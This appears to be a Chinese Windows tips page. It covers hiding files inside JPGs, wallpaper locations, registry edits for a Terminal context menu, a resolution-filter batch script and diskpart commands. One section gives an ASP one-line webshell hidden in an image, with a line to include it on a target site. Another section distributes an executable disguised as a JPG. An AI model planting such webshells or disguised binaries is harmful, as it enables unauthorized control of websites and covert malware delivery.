Windows速查手册

图片藏exe

同理也可以藏木马

以藏PVW32Con.exe（识别图片分辨率等信息的软件）为例

准备好PVW32Con.ico

把PVW32Con.exe压缩，得到PVW32Con.zip

之后使用cmd输入：

 copy PVW32Con.ico/b+PVW32Con.zip/b PVW32Con.jpg

之后便可以得到PVW32Con.jpg，用压缩软件打开图片即可看到PVW32Con.exe，同时图片可以正常浏览。

一句话木马为：

copy 1.jpg/b+1.asp/a 2.jpg

/b 意思是二进制文件

/a 意思是ASCII码文件

asp文件内容 <%eval request("value")%>

把<% #include files=”2.jpg”%>放入目标网站，即可执行asp

Windows聚焦图片文件位置

C:\Users\你的用户名\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets

去除开始菜单的chrome背景色

找到chrome的位置

删除chrome.VisualElementsManifest.xml即可

新建文件夹

为右键菜单增加Terminal等

1、删除Windows Terminal自带右键菜单

删除：

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Blocked]
"{9F156763-7844-4DC4-B2B1-901F640F5155}"="WindowsTerminal"

添加：

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Blocked]
"{9F156763-7844-4DC4-B2B1-901F640F5155}"=-

原理添加类似于添加黑名单

2、添加自己的Windows Terminal

图标在此：https://cdn.jsdelivr.net/gh/Superdeeep/photo/ico.zip

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\Terminal]
"Icon"="C:\\Program Files\\wt.ico" ;图标文件存储位置,下同
@="Open in Terminal"

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\background\shell\Terminal\command]
@="C:\\Users\\你的用户名\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe -p \"Command Prompt\" -d ."

批量筛选图片

需要用到pvw32con.exe

请下载如下的图片，请不要直接拖出来，是下载该图片

请确保文件名为 PVW32Con.exe.jpg

下载完成后，不要修改后缀名（修改成压缩包后缀名是无法打开的），直接用压缩软件打开，即可看到pvw32con.exe，之后你可以把它解压出来。

以下为复制Windows聚焦图片并筛选出1920X1080的图片，并把筛选出的图片放到桌面的脚本

请把脚本和PVW32Con.exe放在同一目录下后再运行脚本

@color 0a
md C:\Users\%username%\desktop\wallpaper
md C:\temp\wallpaper\
copy "C:\Users\%username%\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets" "C:\temp\wallpaper\"
cd "C:\temp\wallpaper\"
ren *.? *.jpg
set "mulu=C:\temp\wallpaper\"
set "www=1920"

set "path=%path%;%~dp0"
pushd "%mulu%\"

>"%temp%\.p" (
    echo "%cd%"
    dir /a:d /s /b
)

for /f "usebackq delims=" %%P in ("%temp%\.p") do (
    if exist "%%~P\*.jpg" (
        >"%temp%\.p" pvw32con "%%~P\*.jpg"
        for /f "usebackq tokens=1,2 delims=:" %%i in ("%temp%\.p") do (
            set file="%%~P\%%i"
            set width=%%j
            set /a width = width
            SetLocal EnableDelayedExpansion
            if !width! lss %www% del /a /f !file!
            EndLocal
        )
    )
)

del "%temp%\.p"
popd

copy "C:\temp\wallpaper\" "C:\Users\%username%\desktop\wallpaper\"
cd "C:\temp\"
del wallpaper /q
pause

Diskpart命令

Diskpart命令 !!!此命令会清除硬盘内所有数据!!!

  • Diskpart常用命令如下

    • 转换为GPT/mbr分区

      diskpart
list disk
select disk=1
convert gpt
convert mbr

    • 安装系统时磁盘分区

      diskpart
clean   rem 清除物理磁盘所有信息
create partition primary size=102400   rem 100GB的大小
active   rem 激活主分区
format quick    rem 快速格式化主分区

    • 创建其他的分区

      create partition primary size=102400    rem 创建100GB主分区
create partition extended    rem 创建扩扩展分区
create partition logical size=102400    rem 创建100G逻辑分区
create partition logic    rem 将剩余扩展分区全部作为逻辑分区
delete partition     rem 删除分区
Windows10预留保留空间管理 
DISM.exe /Online /Get-ReservedStorageState
DISM.exe /Online /Set-ReservedStorageState /State:Enabled
DISM.exe /Online /Set-ReservedStorageState /State:Disabled
